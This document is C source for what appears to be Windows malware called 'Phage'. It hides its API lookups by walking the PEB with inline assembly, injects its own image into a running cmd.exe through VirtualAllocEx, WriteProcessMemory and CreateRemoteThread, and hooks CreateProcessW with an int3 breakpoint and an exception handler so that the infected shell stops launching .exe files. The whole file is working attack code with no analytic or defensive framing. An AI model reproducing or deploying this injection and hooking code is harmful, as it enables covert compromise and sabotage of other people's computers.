#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

// kernel32
typedef HMODULE(WINAPI *pfnLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *pfnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HANDLE(WINAPI *pfnCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI *pfnProcess32FirstW)(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
typedef BOOL(WINAPI *pfnProcess32NextW)(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
typedef HANDLE(WINAPI *pfnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandles, DWORD dwProcessId);
typedef BOOL(WINAPI *pfnCloseHandle)(HANDLE hObject);
typedef BOOL(WINAPI *pfnIsWow64Process)(HANDLE hProcess, PBOOL Wow64Process);
typedef HANDLE(WINAPI *pfnGetProcessHeap)(VOID);
typedef LPVOID(WINAPI *pfnHeapAlloc)(HANDLE hHeap, DWORD dwFlags, DWORD dwBytes);
typedef BOOL(WINAPI *pfnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
typedef LPVOID(WINAPI *pfnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *pfnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef HANDLE(WINAPI *pfnCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpThread, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef BOOL(WINAPI *pfnHeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
typedef DWORD(WINAPI *pfnGetLastError)(VOID);
typedef VOID(WINAPI *pfnExitProcess)(UINT uExitCode);
typedef VOID(WINAPI *pfnGetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
typedef DWORD(WINAPI *pfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef HANDLE(WINAPI *pfnGetModuleHandleW)(LPCSTR lpModuleName);
typedef BOOL(WINAPI *pfnCreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAtributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

// shwlapi
typedef PWSTR(WINAPI *pfnStrStrIW)(PCWSTR pszFirst, PCWSTR pszSrch);

// user32
#ifdef _DEBUG
typedef int(WINAPI *pfnwvsprintfW)(LPWSTR lpOutput, LPCWSTR lpFmt, va_list arglist);
typedef int(WINAPI *pfnMessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
#endif // _DEBUG

pfnLoadLibraryA fnLoadLibraryA = NULL;
pfnGetProcAddress fnGetProcAddress = NULL;

pfnCreateToolhelp32Snapshot fnCreateToolhelp32Snapshot = NULL;
pfnProcess32FirstW fnProcess32FirstW = NULL;
pfnProcess32NextW fnProcess32NextW = NULL;
pfnOpenProcess fnOpenProcess = NULL;
pfnCloseHandle fnCloseHandle = NULL;
pfnIsWow64Process fnIsWow64Process = NULL;
pfnGetProcessHeap fnGetProcessHeap = NULL;
pfnHeapAlloc fnHeapAlloc = NULL;
pfnGetModuleFileNameW fnGetModuleFileNameW = NULL;
pfnVirtualAllocEx fnVirtualAllocEx = NULL;
pfnWriteProcessMemory fnWriteProcessMemory = NULL;
pfnCreateRemoteThread fnCreateRemoteThread = NULL;
pfnHeapFree fnHeapFree = NULL;
pfnGetLastError fnGetLastError = NULL;
pfnExitProcess fnExitProcess = NULL;
pfnGetNativeSystemInfo fnGetNativeSystemInfo = NULL;
pfnWaitForSingleObject fnWaitForSingleObject = NULL;
pfnGetModuleHandleW fnGetModuleHandleW = NULL;
pfnCreateProcessW fnCreateProcessW = NULL;

// shwlapi
pfnStrStrIW fnStrStrIW = NULL;

// user32
#ifdef _DEBUG
pfnwvsprintfW fnwvsprintfW = NULL;
pfnMessageBoxW fnMessageBoxW = NULL;
#endif // _DEBUG

// hooking variables
BYTE bCreateSavedByte;
FARPROC fpCreateProcessW = NULL;

void Debug(LPCWSTR fmt, ...) {
#ifdef _DEBUG
	va_list args;
	va_start(args, fmt);

	WCHAR szOutput[MAX_PATH];
	fnwvsprintfW(szOutput, fmt, args);
	fnMessageBoxW(NULL, szOutput, L"Phage Debug", MB_OK);

	va_end(args);
#endif // _DEBUG
}

/*
* Walk the import table and fix the addresses
*/
BOOL RebuildImportTable(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh) {
	// parse import table if size != 0
	if (pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
		// https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
		PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		// Walk until you reached an empty IMAGE_IMPORT_DESCRIPTOR
		while (pImportDescriptor->Name != NULL) {
			// get the name of each DLL
			LPSTR lpLibrary = (PCHAR)((DWORD)(lpBaseAddress) + pImportDescriptor->Name);

			HMODULE hLibModule = fnLoadLibraryA(lpLibrary);

			PIMAGE_THUNK_DATA nameRef = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress) + pImportDescriptor->Characteristics);
			PIMAGE_THUNK_DATA symbolRef = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress) + pImportDescriptor->FirstThunk);
			PIMAGE_THUNK_DATA lpThunk = (PIMAGE_THUNK_DATA)((DWORD)(lpBaseAddress) + pImportDescriptor->FirstThunk);
			for (; nameRef->u1.AddressOfData; nameRef++, symbolRef++, lpThunk++) {
				// fix addresses
				// check if import by ordinal
				if (nameRef->u1.AddressOfData & IMAGE_ORDINAL_FLAG)
					*(FARPROC *)lpThunk = fnGetProcAddress(hLibModule, MAKEINTRESOURCEA(nameRef->u1.AddressOfData));
				else {
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((DWORD)(lpBaseAddress) + nameRef->u1.AddressOfData);
					*(FARPROC *)lpThunk = fnGetProcAddress(hLibModule, (LPCSTR)(&thunkData->Name));
				}
			}
			//FreeLibrary(hLibModule);
			// advance to next IMAGE_IMPORT_DESCRIPTOR
			pImportDescriptor++;
		}
	}
		
	return TRUE;
}

/*
* Walk the relocation table and fix the location
* of data with the delta offset
* https://stackoverflow.com/questions/34086866/loading-an-executable-into-current-processs-memory-then-executing-it
*/
BOOL BaseRelocate(LPVOID lpBaseAddress, PIMAGE_NT_HEADERS pinh, DWORD dwDelta) {
	// check if relocation table exists
	if (!pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress || !pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
		return FALSE;

	IMAGE_BASE_RELOCATION *r = (IMAGE_BASE_RELOCATION *)((DWORD)(lpBaseAddress) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); //The address of the first I_B_R struct 
	IMAGE_BASE_RELOCATION *r_end = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)(r) + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION)); //The addr of the last
	for (; r < r_end; r = (IMAGE_BASE_RELOCATION *)((DWORD_PTR)(r) + r->SizeOfBlock)) {
		WORD *reloc_item = (WORD *)(r + 1);
		DWORD num_items = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD i = 0; i < num_items; ++i, ++reloc_item) {
			switch (*reloc_item >> 12) {
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*(DWORD_PTR *)((DWORD)(lpBaseAddress) + r->VirtualAddress + (*reloc_item & 0xFFF)) += dwDelta;
					break;
				default:
					return FALSE;
			}
		}
	}

	return TRUE;
}

void Infect(DWORD dwImageBase) {
	// get self module base
	DWORD dwSelfImageBase = dwImageBase;
	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(dwSelfImageBase);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(dwSelfImageBase + pidh->e_lfanew);

	// read own memory
	Debug(L"Reading own memory...");
	LPBYTE lpSelf = (LPBYTE)(fnHeapAlloc(fnGetProcessHeap(), HEAP_ZERO_MEMORY, pinh->OptionalHeader.SizeOfImage));
	CopyMemory(lpSelf, (LPVOID)dwSelfImageBase, pinh->OptionalHeader.SizeOfImage);

	Debug(L"Getting process");
	// select target process
	SYSTEM_INFO si;
	LPVOID lpAddress = NULL;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// check whether machine architecture is 32-/64-bit
	fnGetNativeSystemInfo(&si);
	HANDLE hSnapshot = fnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (fnProcess32FirstW(hSnapshot, &pe32)) {
		while (fnProcess32NextW(hSnapshot, &pe32)) {
			if (wcsicmp(pe32.szExeFile, L"cmd.exe")) continue;
			BOOL bWow64 = FALSE;
			hProcess = fnOpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
			if (hProcess && (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL || (fnIsWow64Process(hProcess, &bWow64) && bWow64))) {
				// check if same process
				WCHAR szModuleName[MAX_PATH];
				fnGetModuleFileNameW(NULL, szModuleName, MAX_PATH);
				if (fnStrStrIW(szModuleName, pe32.szExeFile)) {
					fnCloseHandle(hProcess);
					continue;
				}
				// allocate space in process
				lpAddress = fnVirtualAllocEx(hProcess, NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (lpAddress) {
					Debug(L"Got %s", pe32.szExeFile);
					break;
				}
				fnCloseHandle(hProcess);
			}
		}
		if (!hProcess || !lpAddress)
			return Debug(L"Out of processes");
	}
	fnCloseHandle(hSnapshot);

	Debug(L"Relocating base");
	// get allocated address's module base
	DWORD dwTargetImageBase = (DWORD)(lpAddress);
	// get delta for base relocation
	DWORD dwDelta = dwTargetImageBase > dwSelfImageBase ? dwTargetImageBase - dwSelfImageBase : dwSelfImageBase - dwTargetImageBase;
	if (BaseRelocate((LPVOID)(lpSelf), pinh, dwDelta)) {
		Debug(L"Infecting process");
		// write to target process
		if (fnWriteProcessMemory(hProcess, lpAddress, lpSelf, pinh->OptionalHeader.SizeOfImage, NULL)) {
			// get export table to location Start exported function
			PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)(dwSelfImageBase + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			// get address of Start function (first (and only) export function
			DWORD dwEntryPoint = dwTargetImageBase + ((LPDWORD)(dwSelfImageBase + pied->AddressOfFunctions))[0];
			Debug(L"Executing");
			// execute
			HANDLE hThread = fnCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(dwEntryPoint), (LPVOID)(dwTargetImageBase), 0, NULL);
		} else
			return Debug(L"Failed to write process: %lu", fnGetLastError());
	}

	fnHeapFree(GetProcessHeap(), 0, lpSelf);
	fnCloseHandle(hProcess);
}

void InitialiseFunctions(void) {
	HMODULE hKernel32Mod = NULL;
	__asm {
		pushad
		mov		eax, fs:[0x30]
		mov		eax, [eax + 0x0C]
		mov		eax, [eax + 0x14]
		mov		eax, [eax]
		mov		eax, [eax]
		mov		eax, [eax + 0x10]
		mov		hKernel32Mod, eax
		popad
	}

	// get DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh->e_lfanew);
	// find eat
	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// find functions
	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfFunctions);
	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfNames);
	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied->AddressOfNameOrdinals);

	// loop through all names of functions and select LoadLibrary and GetProcAddress
	for (int i = 0; i < pied->NumberOfNames; i++) {
		LPCSTR lpName = (LPCSTR)((DWORD)hKernel32Mod + dwNames[i]);
		if (!strcmp(lpName, "LoadLibraryA"))
			fnLoadLibraryA = (pfnLoadLibraryA)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
		else if (!strcmp(lpName, "GetProcAddress"))
			fnGetProcAddress = (pfnGetProcAddress)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
	}

	// load libraries
	HMODULE hUser32Mod = fnLoadLibraryA("user32.dll");
	HMODULE hShlwapiMod = fnLoadLibraryA("shlwapi.dll");

	// kernel32
	// functions to reinfect another process
	fnCreateToolhelp32Snapshot = (pfnCreateToolhelp32Snapshot)fnGetProcAddress(hKernel32Mod, "CreateToolhelp32Snapshot");
	fnProcess32FirstW = (pfnProcess32FirstW)fnGetProcAddress(hKernel32Mod, "Process32FirstW");
	fnProcess32NextW = (pfnProcess32NextW)fnGetProcAddress(hKernel32Mod, "Process32NextW");
	fnOpenProcess = (pfnOpenProcess)fnGetProcAddress(hKernel32Mod, "OpenProcess");
	fnCloseHandle = (pfnCloseHandle)fnGetProcAddress(hKernel32Mod, "CloseHandle");
	fnIsWow64Process = (pfnIsWow64Process)fnGetProcAddress(hKernel32Mod, "IsWow64Process");
	fnGetProcessHeap = (pfnGetProcessHeap)fnGetProcAddress(hKernel32Mod, "GetProcessHeap");
	fnHeapAlloc = (pfnHeapAlloc)fnGetProcAddress(hKernel32Mod, "HeapAlloc");
	fnGetModuleFileNameW = (pfnGetModuleFileNameW)fnGetProcAddress(hKernel32Mod, "GetModuleFileNameW");
	fnVirtualAllocEx = (pfnVirtualAllocEx)fnGetProcAddress(hKernel32Mod, "VirtualAllocEx");
	fnWriteProcessMemory = (pfnWriteProcessMemory)fnGetProcAddress(hKernel32Mod, "WriteProcessMemory");
	fnCreateRemoteThread = (pfnCreateRemoteThread)fnGetProcAddress(hKernel32Mod, "CreateRemoteThread");
	fnHeapFree = (pfnHeapFree)fnGetProcAddress(hKernel32Mod, "HeapFree");
	fnGetLastError = (pfnGetLastError)fnGetProcAddress(hKernel32Mod, "fnGetLastError");
	fnExitProcess = (pfnExitProcess)fnGetProcAddress(hKernel32Mod, "ExitProcess");
	fnGetNativeSystemInfo = (pfnGetNativeSystemInfo)fnGetProcAddress(hKernel32Mod, "GetNativeSystemInfo");
	// functions for payload
	fnWaitForSingleObject = (pfnWaitForSingleObject)fnGetProcAddress(hKernel32Mod, "WaitForSingleObject");
	fnGetModuleHandleW = (pfnGetModuleHandleW)fnGetProcAddress(hKernel32Mod, "GetModuleHandleW");
	fnCreateProcessW = (pfnCreateProcessW)fnGetProcAddress(hKernel32Mod, "CreateProcessW");

	// shwlapi
	fnStrStrIW = (pfnStrStrIW)fnGetProcAddress(hShlwapiMod, "StrStrIW");

	// user32
	// debugging functions
#ifdef _DEBUG
	fnwvsprintfW = (pfnwvsprintfW)fnGetProcAddress(hUser32Mod, "wvsprintfW");
	fnMessageBoxW = (pfnMessageBoxW)fnGetProcAddress(hUser32Mod, "MessageBoxW");
#endif // _DEBUG

}

BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b) {
	DWORD dwOldProt = 0;
	if (VirtualProtect(fpFunc, sizeof(BYTE), PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE)
		return FALSE;

	MoveMemory(fpFunc, b, sizeof(BYTE));

	return VirtualProtect(fpFunc, sizeof(BYTE), dwOldProt, &dwOldProt);
}

VOID InitialiseHooks(VOID) {
	static BOOL bSaved = FALSE;
	fpCreateProcessW = fnGetProcAddress(fnLoadLibraryA("kernel32"), "CreateProcessW");
	if (!fpCreateProcessW) {
		Debug(L"Get CreateFile error: %lu", fnGetLastError());
		return;
	}

	if (bSaved == FALSE) {
		bCreateSavedByte = *(LPBYTE)fpCreateProcessW;
		bSaved = TRUE;
	}

	//Debug(L"NextSavedByte: 0x%02x\n%p: 0x%02x", bNextSavedByte, fpFindNextFileW, fpFindNextFileW);

	const BYTE bInt3 = 0xCC;
	if (!WriteMemory(fpCreateProcessW, &bInt3)) {
		Debug(L"WriteInt3 error: %lu", fnGetLastError());
		//fnExitThread(0);
	}
	//Debug(L"%p: 0x%02x", fpFindNextFileW, *(LPBYTE)fpFindNextFileW);
}

BOOL WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
	Debug(L"Creating %s", lpApplicationName);

	if (!WriteMemory(fpCreateProcessW, &bCreateSavedByte)) {
		Debug(L"MyCreateProcessW WriteMemory error: %lu", fnGetLastError());
		//fnExitThread(0);
	}

	BOOL b = FALSE;
	if (!fnStrStrIW(lpApplicationName, L".exe"))
		b = fnCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);

	InitialiseHooks();
	return b;
}

LONG WINAPI MyUnhandledExceptionFilter(LPEXCEPTION_POINTERS lpException) {
	//Debug(L"In exception");
	if (lpException->ContextRecord->Eip == (DWORD_PTR)fpCreateProcessW)
		lpException->ContextRecord->Eip = (DWORD_PTR)MyCreateProcessW;

	return EXCEPTION_CONTINUE_EXECUTION;
}

__declspec(dllexport) void __cdecl Start(LPVOID lpParam) {
	DWORD dwImageBase = (DWORD)(lpParam);

	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(dwImageBase);
	// get NT headers
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)(dwImageBase + pidh->e_lfanew);

	InitialiseFunctions();

	//if (!RebuildImportTable((LPVOID)(dwImageBase), pinh))
	//	return Debug(L"Failed to rebuild import table");

	//Debug(L"Infecting");
	//Infect(dwImageBase);
	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)MyUnhandledExceptionFilter);
	InitialiseHooks();

	fnWaitForSingleObject(fnGetModuleHandleW(NULL), INFINITE);

	//fnExitProcess(0);
}

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShow) {
	InitialiseFunctions();
	Infect((DWORD)(fnGetModuleHandleW(NULL)));

	return 0;
}